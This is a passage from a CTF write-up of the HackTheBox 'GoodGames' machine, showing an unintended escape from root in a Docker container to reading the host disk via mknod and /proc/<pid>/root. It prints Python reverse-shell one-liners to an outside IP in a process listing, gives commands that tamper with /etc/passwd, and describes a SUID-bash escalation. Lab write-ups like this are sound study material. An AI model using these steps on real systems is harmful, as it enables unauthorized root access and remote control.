

##
#
https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/
#
##

   Unintended3 path for privilege escalation
Now we have to make a decision: we can try to solve it the easy way, or we can try to solve it the difficult way. Naturally I decided to go for the difficult way.4

We have the following situation:

Root in the Docker
User in the host
I searched online for a privilege escalation method for this and I found the following article.

It described a way of being able to read /dev/sda using the mknod command. I decided to exactly reproduce the following image of the blog:5



Get another reverse shell in docker as root (send the Burp request again with a different port)
Run mknod sda b 8 0, chmod 777 sda, add augustus and su to augustus to open a /bin/sh session in the Docker:
# cd /
cd /
# mknod sda b 8 0
mknod sda b 8 0
# chmod 777 sda
chmod 777 sda
```
# echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# su augustus
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$ 
On the host check the process ID of the /bin/sh shell in the Docker:
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh
The process ID is 1659 in this case
Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda 
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
HTB{M0un73d_F1l3_Sy57eM5_4r3_DaNg3R0uS}
```
grep: memory exhausted
augustus@GoodGames:~$ 
And this gives both flags after a short amount of time.

The --exclude-length was required since the website always respond with a 200 status code while it is actually a 404 ↩︎

This payload is copied from the “Exploit the SSTI by calling Popen without guessing the offset” payload at Hacktricks. In my experience, this one works the best. ↩︎

I shared this method in the Discord and there I heard that this was not the intended way of getting the root flag ↩︎

Actually, I did not really think of copying /bin/bash to the home directory of augustus, setting the SUID bit, changing owner to root and run the binary as augustus on the host so you end up with an easy privilege escalation. This would have been the easy path. ↩︎

On the left you can see the shell in the Docker container. On the right the shell in the host. ↩︎

